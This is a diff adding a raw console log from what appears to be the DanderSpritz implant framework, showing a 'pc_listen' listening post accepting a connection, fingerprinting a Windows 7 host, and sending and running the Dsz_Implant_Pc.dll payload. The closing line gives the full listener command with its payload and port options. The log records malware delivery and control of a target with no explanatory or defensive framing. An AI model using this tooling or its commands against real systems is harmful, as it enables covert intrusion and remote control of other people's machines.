@@ -1,0 +1,101 @@
+[09:37:13] ID: 41 'pc_listen' started [target: z0.0.0.1]
+lpPeddleCheapListen:  PC_PROTOCOL_HTTP
+        Listening on HTTP proxy port 80.
+        Listening on HTTP proxy port 443.
+Waiting for connection...
+Setting Sockopt
+        Listening on [0.0.0.0]:3005.
+Valid connection from 10.0.0.10 on port 80
+Connection received from [127.0.0.1]:1893 to [127.0.0.1]:3005...
+Connection accepted
+Starting session...
+PC LP Version: 2.3.0
+LP...ready to send the MAGIC NUMBER
+Sending additional 185 bytes of random
+LP ...ready to receive the symmetric key
+LP...ready to decrypt the key
+
+Remote Information
+    PC Version : 2.3.0
+         PC Id : 0x0000000000000000
+       Arch-Os : x64-winnt (compiled x64-winnt)
+   Session Key : 9a c9 6b c2 ca 87 7c 53 94 f1 e5 dc f0 09 d0 7e
+
+Getting remote OS information
+
+Remote OS
+             Arch : x64
+    Compiled Arch : x64
+         Platform : winnt
+Compiled Platform : winnt
+          Version : 6.1 (Windows 7)
+     Service Pack : 1
+    C Lib Version : 6.0.0
+
+Sending OS version check status to remote side (4 bytes)
+Data (OS version check status) has been sent
+Data (OS version check status) has been received and stored by remote side
+
+Ready to send implant
+Successfully loaded LP DLLs
+
+Payload 
+      File Name : C:\johnb\fuzzbunch-master-new\Resources\Pc\/../Dsz/Payloads/Files/x64-winnt-vc9s/release/Dsz_Implant_Pc.dll
+   Send payload : true
+  Original Size : 338944
+      Send Size : 166644
+       Checksum : 5d20
+           Name : 
+           Path : 
+         Export : #1
+
+
+Sending PayloadInfo run type information
+Sending File/Library info to remote side (36 bytes)
+Data (File/Library info) has been sent
+Data (File/Library info) has been received and stored by remote side
+
+Sending Export name to remote side (3 bytes)
+Data (Export name) has been sent
+Data (Export name) has been received and stored by remote side
+
+Sending Payload to remote side (166644 bytes)
+Data (Payload) has been sent
+Data (Payload) has been received and stored by remote side
+
+... Receiving Acknowledgements
+
+Received successful status message for Dll/Exe loaded
+Received successful status message for About to run payload
+Received successful status message for Exit This Message Loop
+
+
+Setting remote address to z0.0.0.12
+       Remote Address : z0.0.0.12
+         Architecture : x64
+Compiled Architecture : x64
+             Platform : winnt
+              Version : 6.1.1 (build 7601)
+    C Library Version : 7.1.0
+           Process Id : 488
+                 Type : Dsz
+             Metadata : type=PC local=127.0.0.1:3005 remote=127.0.0.1:1893
+
+Loading module 154 (addr=z0.0.0.1 | type=dsz | file=Script_Lp.dll)
+CHM: Module load failure
+
+    *** Command indicated failure ***
+* Failed to load LP module 154
+
+    *** Command indicated failure ***
+Loading module 154 (addr=z0.0.0.1 | type=dsz | file=Script_Lp.dll)
+CHM: Module load failure
+
+    *** Command indicated failure ***
+* Failed to load LP module 154
+
+    *** Command indicated failure ***
+
+    Command completed successfully
+[09:42:11] Backgrounded 'pc_listen -key "Default" -payload "Danderspritz" -run "memlib" -http 3005 "80 443" "TlEo:" "127.0.0.1" 12288 -autoaccept  '  Id: 41
+
